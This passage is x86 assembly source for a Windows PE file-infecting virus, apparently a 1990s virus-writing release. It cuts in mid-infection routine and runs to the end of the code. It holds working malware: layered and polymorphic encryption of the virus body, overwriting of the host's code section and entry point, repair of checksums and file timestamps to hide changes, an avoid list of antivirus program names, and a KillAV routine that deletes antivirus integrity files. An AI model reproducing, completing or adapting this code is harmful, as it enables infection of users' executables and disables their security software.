       mov esi, [ebp+increment] 		   ;�get key increment
       mov ecx, incrsize/4			   ;�size of code
       mov ebx, [ebp+iterations]		   ;�number of iterations
       push edi 				   ;�save edi
						   ;�
encrypt_loop:					   ;�
       mov edx, [edi]				   ;�get dword
       rol edx, 1				   ;�
       xor edx, esi				   ;�
       sub edx, eax				   ;�
       sub eax, esi				   ;�
       mov [edi], edx				   ;�and store
       add edi, 4				   ;�go to next dword
       loop encrypt_loop			   ;�loop until end
       dec ebx					   ;�decrement iterations
       jz ready_				   ;�
       mov eax, [ebp+key]			   ;�
       mov ecx, incrsize/4			   ;�redo all...
       pop edi					   ;�
       push edi 				   ;�
       jmp encrypt_loop 			   ;�
						   ;�
ready_: 					   ;�
       pop edi					   ;�
       popa					   ;�
						   ;�
       mov esi, [ebp+codesection]		   ;�and now move the virus
       mov edi, [esi.SH_PointerToRawData]	   ;�body over the original
       add edi, [ebp+randomincr]		   ;�
       lea esi, [ebp+start]			   ;�code section.
       add edi, [ebp+mapaddress]		   ;�
       push edi 				   ;�
       mov ecx, virussize			   ;�
       rep movsb				   ;�
						   ;�
       mov eax, [ebp+codesection]		   ;�store the new EIP
       mov eax, [eax.SH_VirtualAddress] 	   ;�
       add eax, [ebp+randomincr]		   ;�
       mov [ebp+neweip], eax			   ;�
       add eax, @12-start-1			   ;�and fill in the image
       pop edx					   ;�base getter
       add edx, (@12-start)+1			   ;�
       mov dword ptr [edx], eax 		   ;�
						   ;�
       mov eax, [ebp+codesection]		   ;�now fill the jump
       mov edx, [eax.SH_PointerToRawData]	   ;�to the host
       add edx, [ebp+mapaddress]		   ;�
       add edx, [ebp+randomincr]		   ;�
       add edx, @11-start+1			   ;�
       mov eax, [ebp+jumper]			   ;�
       mov dword ptr [edx], eax 		   ;�
						   ;�
       pusha					   ;�now do the level 2
       mov ecx, 100h				   ;�encryption
						   ;�
encrypt_iteration:				   ;�
       mov edx, 'DEAD'+'MEAT'			   ;�
       mov esi, [ebp+codesection]		   ;�
       mov edi, [esi.SH_PointerToRawData]	   ;�
       add edi, (decrypt_level_2 - start)	   ;�
       add edi, [ebp+randomincr]		   ;�
       add edi, [ebp+mapaddress]		   ;�
       mov esi, edi				   ;�
       mov ebx, (end-decrypt_level_2)/4 	   ;�
						   ;�
encrypt_routine:				   ;�
       lodsd					   ;�
						   ;�
       add eax, edx				   ;�
       sub eax, 'THUN'+'DERP'+'ICK'		   ;�
       ror eax, 16				   ;�
       xor eax, 'LORD'+'JULU'+'S'		   ;�
       rol eax, 16				   ;�
       add edx, 'KICK'+'ASS!'			   ;�
						   ;�
       stosd					   ;�
       dec ebx					   ;�
       jnz encrypt_routine			   ;�
       loop encrypt_iteration			   ;�
       popa					   ;�
						   ;�
       add [ebx.SH_VirtualSize], incrsize	   ;�increase Virtual Size
						   ;�of last section
       mov eax, [ebx.SH_SizeOfRawData]		   ;�increase Size of raw
       add eax, incrsize			   ;�data and align it
       mov ecx, [ebp+filealign] 		   ;�
       xor edx, edx				   ;�
       div ecx					   ;�
       inc eax					   ;�
       mul ecx					   ;�
       mov [ebx.SH_SizeOfRawData], eax		   ;�
						   ;�
       or [ebx.SH_Characteristics], 0C0000000h	   ;�make it R/W
						   ;�
       mov eax, [ebx.SH_PointerToRawData]	   ;�now calculate the new
       add eax, [ebx.SH_VirtualSize]		   ;�file size
       mov edi, eax				   ;�
       mov ecx, [ebp+filealign] 		   ;�
       xor edx, edx				   ;�
       div ecx					   ;�
       inc eax					   ;�
       mul ecx					   ;�
       mov [ebp+filesize], eax			   ;�
						   ;�
       mov ecx, eax				   ;�zero the rest
       sub ecx, edi				   ;�
       add edi, [ebp+mapaddress]		   ;�
       xor eax, eax				   ;�
       rep stosb				   ;�
						   ;�
       pusha					   ;�prepare to call the
       mov eax, [ebp+codesection]		   ;�poly engine
       mov eax, [eax.SH_VirtualAddress] 	   ;�
       add eax, [ebp+randomincr]		   ;�
       add eax, poly_code_start-start		   ;�
       mov ebx, eax				   ;�
						   ;�
       mov edi, [ebp+codesection]		   ;�
       mov edi, [edi.SH_PointerToRawData]	   ;�
       add edi, [ebp+mapaddress]		   ;�
       add edi, [ebp+randomincr]		   ;�
       add edi, poly_code_start-start		   ;�
						   ;�
       mov esi, edi				   ;�
       sub esi, poly_code_start-start		   ;�
       add esi, poly_decryptor-start		   ;�
						   ;�
       mov ecx, end-poly_code_start		   ;�
						   ;�
       call create_poly 			   ;�make the poly decr.
						   ;�
       popa					   ;�
						   ;�
       mov eax, [ebp+sizeofimage]		   ;�now calculate the new
       add eax, incrsize			   ;�size of image
       mov ecx, [ebp+sectionalign]		   ;�
       xor edx, edx				   ;�
       div ecx					   ;�
       inc eax					   ;�
       mul ecx					   ;�
						   ;�
       mov esi, [ebp+optionalheader]		   ;�
       mov [esi.OH_SizeOfImage], eax		   ;�store it!
						   ;�
       mov eax, [ebp+neweip]			   ;�store the new EIP
       mov [esi.OH_AddressOfEntryPoint], eax	   ;�
						   ;�
       cmp [esi.OH_CheckSum], 0 		   ;�is the checksum null?
       je no_checksum				   ;�
						   ;�
       call @21 				   ;�
       db 'Imagehlp.DLL', 0			   ;�
@21:   call [ebp+_LoadLibraryA] 		   ;�
       or eax, eax				   ;�
       jz no_checksum				   ;�
						   ;�
       call @20 				   ;�here we try to retrieve
       db 'CheckSumMappedFile', 0		   ;�the checksum API
@20:   push eax 				   ;�if we fail it means we
       call [ebp+_GetProcAddress]		   ;�we don't have this api
       or eax, eax				   ;�
       jz no_checksum				   ;�
						   ;�
       call @22 				   ;�compute the new
chksum dd 0					   ;�checksum...
@22:   call @23 				   ;�
       dd 0					   ;�
@23:   push [ebp+filesize]			   ;�
       push [ebp+mapaddress]			   ;�
       call eax 				   ;�
						   ;�
       mov eax, [ebp+chksum]			   ;�
       mov [esi.OH_CheckSum], eax		   ;�and fill it up...
						   ;�
no_checksum:					   ;�
       mov ebx, [ebp+codesection]		   ;�make code section R/W
       or [ebx.SH_Characteristics], 0C0000000h	   ;�
						   ;�
       mov [ebp+flag], 1			   ;�mark good infection
						   ;�
unmap_view:					   ;�
       push [ebp+mapaddress]			   ;�unmap the file
       call [ebp+_UnmapViewOfFile]		   ;�
						   ;�
close_map:					   ;�
       push [ebp+maphandle]			   ;�close the map
       call [ebp+_CloseHandle]			   ;�
						   ;�
close_file:					   ;�
       push FILE_BEGIN				   ;�set the file pointer
       push 0					   ;�to the filesize
       push [ebp+filesize]			   ;�
       push [ebp+filehandle]			   ;�
       call [ebp+_SetFilePointer]		   ;�
						   ;�
       push [ebp+filehandle]			   ;�set the end of file
       call [ebp+_SetEndOfFile] 		   ;�
						   ;�
       lea ebx, [ebp+filetime]			   ;�restore the file time
       push ebx 				   ;�
       add ebx, 8				   ;�
       push ebx 				   ;�
       add ebx, 8				   ;�
       push ebx 				   ;�
       push [ebp+filehandle]			   ;�
       call [ebp+_SetFileTime]			   ;�
						   ;�
       push [ebp+filehandle]			   ;�close the file
       call [ebp+_CloseHandle]			   ;�
						   ;�
quit_infection: 				   ;�restore the attributes
       pop edi					   ;�
       push [ebp+fileattributes]		   ;�
       push edi 				   ;�
       call [ebp+_SetFileAttributes]		   ;�
       popa					   ;�
       cmp [ebp+flag], 1			   ;�
       je do_clc				   ;�
       stc					   ;�bad infection
       ret					   ;�
						   ;�
do_clc: 					   ;�
       clc					   ;�good infection
       ret					   ;�return
filetime       dq 0, 0, 0			   ;�
filesize       dd 0				   ;�
filehandle     dd 0				   ;�
memsize        dd 0				   ;�
maphandle      dd 0				   ;�
mapaddress     dd 0				   ;�
fileattributes dd 0				   ;�
neweip	       dd 0				   ;�
flag	       db 0				   ;�
;����������������������������������������������������������������������������
ValidateName:					   ;�
       pushad					   ;�
						   ;�
       lea esi, [ebp+avoid_list]		   ;�point avoid list
						   ;�
repeat_check_files:				   ;�
       push esi 				   ;�
       call [ebp+_lstrlen]			   ;�get length of string
       mov ecx, eax				   ;�
						   ;�
       push esi edi				   ;�
       rep cmpsb				   ;�compare string
       je file_invalid				   ;�
       pop edi esi				   ;�
       add esi, eax				   ;�go to the next name
       inc esi					   ;�
       cmp byte ptr [esi], 0FFh 		   ;�the end?
       je file_valid				   ;�
       jmp repeat_check_files			   ;�
						   ;�
file_valid:					   ;�
       clc					   ;�file can be infected
       popad					   ;�
       ret					   ;�
						   ;�
file_invalid:					   ;�
       pop edi ecx				   ;�
       stc					   ;�file cannot be infected
       popad					   ;�
       ret					   ;�
						   ;�
avoid_list label				   ;�
	   db 'TB'     ,0			   ;�
	   db 'F-'     ,0			   ;�
	   db 'AW'     ,0			   ;�
	   db 'AV'     ,0			   ;�
	   db 'NAV'    ,0			   ;�
	   db 'PAV'    ,0			   ;�
	   db 'RAV'    ,0			   ;�
	   db 'NVC'    ,0			   ;�
	   db 'FPR'    ,0			   ;�
	   db 'DSS'    ,0			   ;�
	   db 'IBM'    ,0			   ;�
	   db 'INOC'   ,0			   ;�
	   db 'ANTI'   ,0			   ;�
	   db 'SCN'    ,0			   ;�
	   db 'VSAF'   ,0			   ;�
	   db 'VSWP'   ,0			   ;�
	   db 'PANDA'  ,0			   ;�
	   db 'DRWEB'  ,0			   ;�
	   db 'FSAV'   ,0			   ;�
	   db 'SPIDER' ,0			   ;�
	   db 'ADINF'  ,0			   ;�
	   db 'EXPLORER',0			   ;�hmmmm...
	   db 'SONIQUE',0			   ;�
	   db 'SQSTART',0			   ;�
	   db 0FFh				   ;�
;����������������������������������������������������������������������������
KillAV: 					   ;�
       pushad					   ;�
       lea edi, [ebp+offset searchfiles]	   ;�point to Search Record
       lea esi, [ebp+offset av_list]		   ;�point av files list
						   ;�
locate_next_av: 				   ;�
       cmp byte ptr [esi], 0FFh 		   ;�
       je av_kill_done				   ;�
       mov eax, esi				   ;�
       cmp byte ptr [eax], 0FFh 		   ;�is this the end?
       je av_kill_done				   ;�
       push edi 				   ;�push search rec. address
       push eax 				   ;�push filename address
       call [ebp+_FindFirstFileA]		   ;�find first match
       cmp eax, 0FFFFFFFFh			   ;�check for EAX = -1
       je next_av_file				   ;�
       push eax 				   ;�
       lea ebx, [edi.WFD_cFileName]		   ;�ESI = ptr to filename
       push 80h 				   ;�
       push ebx 				   ;�
       call [ebp+_SetFileAttributes]		   ;�
       push ebx 				   ;�push filename address
       call [ebp+_DeleteFileA]			   ;�delete file!
						   ;�
       call [ebp+_FindClose]			   ;�close the find handle
						   ;�
next_av_file:					   ;�
       push edi 				   ;�
       mov edi, esi				   ;�
       mov al, 0				   ;�
       mov ecx, 100				   ;�
       repnz scasb				   ;�
       mov esi, edi				   ;�
       pop edi					   ;�
       jmp locate_next_av			   ;�
						   ;�
av_kill_done:					   ;�
       popad					   ;�
       ret					   ;�
						   ;�
searchfiles WIN32_FIND_DATA <?> 		   ;�
						   ;�
av_list 	 db "AVP.CRC"	  , 0		   ;�the av files to kill
		 db "IVP.NTZ"	  , 0		   ;�
		 db "Anti-Vir.DAT", 0		   ;�
		 db "CHKList.MS"  , 0		   ;�
		 db "CHKList.CPS" , 0		   ;�
		 db "SmartCHK.MS" , 0		   ;�
		 db "SmartCHK.CPS", 0		   ;�
		 db 0FFh			   ;�
;����������������������������������������������������������������������������
ReturnToHost:					   ;�Here we return to the
       jmp restore_seh				   ;�host
						   ;�
ExceptionExit:					   ;�if we had an error we
       mov esp, [esp+8] 			   ;�must restore the ESP
						   ;�
restore_seh:					   ;�
       pop dword ptr fs:[0]			   ;�and restore the SEH
       add esp, 4				   ;�returning to the host...
						   ;�
       db 0BDh					   ;�restore delta handle
delta  dd 0					   ;�
						   ;�
       cmp [ebp+gen1], 1			   ;�is it generation 0?
       je generation0_exit			   ;�
						   ;�
@11:   mov eax, 12345678h			   ;�prepare to jump to
       add eax, [ebp+imagebase] 		   ;�the relocating code
						   ;�
       mov esi, eax				   ;�
       add esi, (@14-relocating_code)		   ;�
       mov ebx, [ebp+imagebase] 		   ;�
       mov dword ptr [esi+1], ebx		   ;�
						   ;�
       push eax 				   ;�do it!
       ret					   ;�
						   ;�
generation0_exit:				   ;�
       popa					   ;�
       push 0					   ;�
       call ExitProcess 			   ;�
gen1 dd 0					   ;�
;����������������������������������������������������������������������������
CheckError proc near				   ;�
       or eax, eax				   ;�sets carry flag if
       jz error_found				   ;�eax = 0 or eax = -1
       cmp eax, -1				   ;�
       jz error_found				   ;�
       clc					   ;�
       ret					   ;�
						   ;�
error_found:					   ;�
       stc					   ;�
       ret					   ;�
CheckError endp 				   ;�
;����������������������������������������������������������������������������
;RoundUp:					   ;�This routine rounds
;	push edx				   ;�the value in EAX to
;	xor edx, edx				   ;�the value in ECX (used
;	div ecx 				   ;�to align section and
;	inc ax					   ;�file sizes).
;	mul ecx 				   ;�
;	pop edx 				   ;�
;	ret					   ;�
;����������������������������������������������������������������������������
k32_API_names label				   ;�
	      db "GetModuleHandleA",0		   ;�
	      db "ExitProcess", 0		   ;�
	      db "GlobalAlloc", 0		   ;�
	      db "GlobalFree", 0		   ;�
	      db "GetWindowsDirectoryA", 0	   ;�
	      db "GetSystemDirectoryA", 0	   ;�
	      db "GetCurrentDirectoryA", 0	   ;�
	      db "SetCurrentDirectoryA", 0	   ;�
	      db "FindFirstFileA", 0		   ;�
	      db "FindNextFileA", 0		   ;�
	      db "GetDriveTypeA", 0		   ;�
	      db "CloseHandle", 0		   ;�
	      db "FindClose", 0 		   ;�
	      db "CreateFileA", 0		   ;�
	      db "CreateFileMappingA", 0	   ;�
	      db "MapViewOfFile", 0		   ;�
	      db "UnmapViewOfFile", 0		   ;�
	      db "SetFilePointer", 0		   ;�
	      db "SetEndOfFile", 0		   ;�
	      db "GetFileSize", 0		   ;�
	      db "lstrlen", 0			   ;�
	      db "SetFileTime", 0		   ;�
	      db "GetFileTime", 0		   ;�
	      db "GetProcAddress", 0		   ;�
	      db "FlushViewOfFile", 0		   ;�
	      db "GetLastError", 0		   ;�
	      db "GetSystemTime", 0		   ;�
	      db "GetFileAttributesA", 0	   ;�
	      db "SetFileAttributesA", 0	   ;�
	      db "DeleteFileA", 0		   ;�
	      db "LoadLibraryA", 0		   ;�
	      db "IsBadReadPtr",0		   ;�
	      db 0FFh				   ;�
						   ;�
k32_API_addrs label				   ;�
						   ;�
_GetModuleHandleA		dd 0		   ;�
_ExitProcess			dd 0		   ;�
_GlobalAlloc			dd 0		   ;�
_GlobalFree			dd 0		   ;�
_GetWindowsDirectoryA		dd 0		   ;�
_GetSystemDirectoryA		dd 0		   ;�
_GetCurrentDirectoryA		dd 0		   ;�
_SetCurrentDirectoryA		dd 0		   ;�
_FindFirstFileA 		dd 0		   ;�
_FindNextFileA			dd 0		   ;�
_GetDriveTypeA			dd 0		   ;�
_CloseHandle			dd 0		   ;�
_FindClose			dd 0		   ;�
_CreateFileA			dd 0		   ;�
_CreateFileMappingA		dd 0		   ;�
_MapViewOfFile			dd 0		   ;�
_UnmapViewOfFile		dd 0		   ;�
_SetFilePointer 		dd 0		   ;�
_SetEndOfFile			dd 0		   ;�
_GetFileSize			dd 0		   ;�
_lstrlen			dd 0		   ;�
_SetFileTime			dd 0		   ;�
_GetFileTime			dd 0		   ;�
_GetProcAddress 		dd 0		   ;�
_FlushViewOfFile		dd 0		   ;�
_GetLastError			dd 0		   ;�
_GetSystemTime			dd 0		   ;�
_GetFileAttributesA		dd 0		   ;�
_SetFileAttributes		dd 0		   ;�
_DeleteFileA			dd 0		   ;�
_LoadLibraryA			dd 0		   ;�
_IsBadReadPtr			dd 0		   ;�
;����������������������������������������������������������������������������
u32_API_names label				   ;�
	      db "MessageBoxA", 0		   ;�
	      db 0FFh				   ;�
						   ;�
u32_API_addrs label				   ;�
						   ;�
_MessageBoxA			dd 0		   ;�
;����������������������������������������������������������������������������
k32		    dd 0			   ;�
kernel32_name	    db "Kernel32.DLL", 0	   ;�
user32_name	    db "USER32.dll", 0		   ;�
						   ;�
getmodulehandle     db "GetModuleHandleA"	   ;�
getmodulehandlelen  =  $-offset getmodulehandle    ;�
getprocaddress	    db "GetProcAddress", 0	   ;�
getprocaddresslen   =  $-offset getprocaddress	   ;�
key	   dd 0 				   ;�
increment  dd 0 				   ;�
iterations dd 0 				   ;�
jumper	   dd 0 				   ;�
;����������������������������������������������������������������������������
FindNeededStuff:				   ;�
       lea eax, [ebp+ExceptionExit]		   ;�Setup a SEH frame
       push eax 				   ;�
       push dword ptr fs:[0]			   ;�
       mov fs:[0], esp				   ;�
						   ;�
       mov eax, [esp+28h]			   ;�first let's locate the
       lea edx, [ebp+kernel32_name]		   ;�kernel32 base address
       call LocateKernel32			   ;�
       jc ReturnToHost				   ;�
       mov dword ptr [ebp+k32], eax		   ;�save it...
						   ;�
       lea edx, dword ptr [ebp+getprocaddress]	   ;�then let's locate
       call LocateGetProcAddress		   ;�GetProcAddress
       jc ReturnToHost				   ;�
						   ;�
       mov ebx, eax				   ;�now let's locate all
       mov eax, dword ptr [ebp+k32]		   ;�the K32 apis we need
       lea edi, dword ptr [ebp+k32_API_names]	   ;�furthure...
       lea esi, dword ptr [ebp+k32_API_addrs]	   ;�
       call LocateApiAddresses			   ;�
       jc ReturnToHost				   ;�
						   ;�
       lea edi, dword ptr [ebp+user32_name]	   ;�Locate USER32
       call LocateModuleBase			   ;�module base
       jc ReturnToHost				   ;�
						   ;�
       lea edi, dword ptr [ebp+u32_API_names]	   ;�and the corresp.
       lea esi, dword ptr [ebp+u32_API_addrs]	   ;�API addresses
       call LocateApiAddresses			   ;�
       jc ReturnToHost				   ;�
						   ;�
       jmp FinishedLocatingStuff		   ;�
;����������������������������������������������������������������������������
Randomize:					   ;�
       push eax 				   ;�initialize the random
       mov eax, dword ptr [esp] 		   ;�number generator
       add dword ptr [ebp+seed], eax		   ;�
       pop eax					   ;�
       ret					   ;�
;����������������������������������������������������������������������������
random32:					   ;�
       push ecx 				   ;�
       xor ecx, ecx				   ;�
       mov eax, dword ptr [ebp+seed]		   ;�
       mov cx, 33				   ;�
						   ;�
rloop:						   ;�
       add eax, eax				   ;�
       jnc $+4					   ;�
       xor al, 197				   ;�
       loop rloop				   ;�
       mov dword ptr [ebp+seed], eax		   ;�
       pop ecx					   ;�
       ret					   ;�
seed dd 0BFF81234h				   ;�
;����������������������������������������������������������������������������
brandom32:					   ;�
       push edx 				   ;�this procedure gets
       push ecx 				   ;�a random value in eax
       mov edx, 0				   ;�between 0 and ecx
       push eax 				   ;�
       call random32				   ;�
       pop ecx					   ;�
       div ecx					   ;�
       xchg eax, edx				   ;�
       pop ecx					   ;�
       pop edx					   ;�
       ret					   ;�
;����������������������������������������������������������������������������
db 'The world is full of kings and queens',10,13   ;�
db 'That blind your eyes and steal your dreams'    ;�
db 10,13					   ;�
db 'It''s HEAVEN and HELL!!!',10,13		   ;�
;����������������������������������������������������������������������������
relocating_code:				   ;�this part will restore
@7:    mov esi, 12345678h			   ;�the original code sec.
@8:    mov edi, 12345678h			   ;�and jump to the orig.
       add edi, [ebp+imagebase] 		   ;�EIP.
       add esi, [ebp+imagebase] 		   ;�
       mov ecx, virussize			   ;�
       rep movsb				   ;�
       popa					   ;�restore all regs and
@9:    mov eax, 12345678h			   ;�
@14:   add eax, 12345678h			   ;�
       push eax 				   ;�
       nop					   ;�
       ret					   ;�
relo_code_size = $-offset relocating_code	   ;�
;����������������������������������������������������������������������������
include get_apis.inc				   ;�get apis routines
end label					   ;�end of virus code
;����������������������������������������������������������������������������
virussize = end-start				   ;�virus size
incrsize  = virussize + relo_code_size + 100h	   ;�
end start					   ;�
end						   ;�end of code
;����������������������������������������������������������������������������
